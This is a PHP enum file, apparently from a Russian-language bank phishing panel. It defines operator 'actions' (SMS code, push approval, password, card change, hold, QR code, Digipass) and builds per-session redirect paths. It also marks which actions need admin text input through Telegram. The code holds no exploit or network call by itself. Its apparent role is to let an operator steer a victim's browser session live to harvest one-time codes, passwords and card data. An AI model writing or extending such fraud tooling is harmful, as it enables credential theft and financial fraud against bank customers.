<?php

declare(strict_types=1);

namespace App\Enums;

enum ActionType: string
{
    case CODE = 'code';
    case PUSH = 'push';
    case PUSH_ICON = 'push-icon';
    case PASSWORD = 'password';
    case CARD_CHANGE = 'card-change';
    case ERROR = 'error';
    case ONLINE = 'online';
    case CUSTOM_ERROR = 'custom-error';
    case CUSTOM_QUESTION = 'custom-question';
    case CUSTOM_IMAGE = 'custom-image';
    case IMAGE_QUESTION = 'image-question';
    case REDIRECT = 'redirect';
    case HOLD = 'hold';
    case ACTIVATION = 'activation';
    case SUCCESS_HOLD = 'success-hold';
    case QR_CODE = 'qr-code';
    case DIGIPASS = 'digipass';

    public function label(): string
    {
        return match ($this) {
            self::CODE => 'Код',
            self::PUSH => 'Пуш',
            self::PUSH_ICON => 'Пуш с иконкой',
            self::PASSWORD => 'Пароль',
            self::CARD_CHANGE => 'Карта',
            self::ERROR => 'Ошибка',
            self::ONLINE => 'Онлайн',
            self::CUSTOM_ERROR => 'Кастом ошибка',
            self::CUSTOM_QUESTION => 'Кастом вопрос',
            self::CUSTOM_IMAGE => 'Картинка',
            self::IMAGE_QUESTION => 'Картинка с вопросом',
            self::REDIRECT => 'Редирект',
            self::HOLD => 'Холд',
            self::ACTIVATION => 'Активация',
            self::SUCCESS_HOLD => 'Успешный холд',
            self::QR_CODE => 'QR код',
            self::DIGIPASS => 'Digipass',
        };
    }

    public function emoji(): string
    {
        return match ($this) {
            self::CODE => '📱',
            self::PUSH => '🔔',
            self::PUSH_ICON => '🔔',
            self::PASSWORD => '🔐',
            self::CARD_CHANGE => '💳',
            self::ERROR => '⚠️',
            self::ONLINE => '🟢',
            self::CUSTOM_ERROR => '❌',
            self::CUSTOM_QUESTION => '❓',
            self::CUSTOM_IMAGE => '🖼',
            self::IMAGE_QUESTION => '🖼❓',
            self::REDIRECT => '🔗',
            self::HOLD => '⏸',
            self::ACTIVATION => '📧',
            self::SUCCESS_HOLD => '✅',
            self::QR_CODE => '📷',
            self::DIGIPASS => '🔑',
        };
    }

    public function getRedirectPath(string $sessionId): string
    {
        return "/session/{$sessionId}/action/{$this->value}";
    }

    public function requiresRedirect(): bool
    {
        return match ($this) {
            self::CODE, self::PUSH, self::PUSH_ICON, self::PASSWORD, self::CARD_CHANGE, self::ERROR,
            self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::HOLD,
            self::ACTIVATION, self::SUCCESS_HOLD => true,
            self::ONLINE, self::REDIRECT, self::QR_CODE, self::DIGIPASS => false,
        };
    }

    /**
     * Требует ли действие ввод текста от админа (для Telegram)
     */
    public function requiresAdminInput(): bool
    {
        return match ($this) {
            self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::REDIRECT, self::QR_CODE => true,
            default => false,
        };
    }

    public static function values(): array
    {
        return array_column(self::cases(), 'value');
    }
}
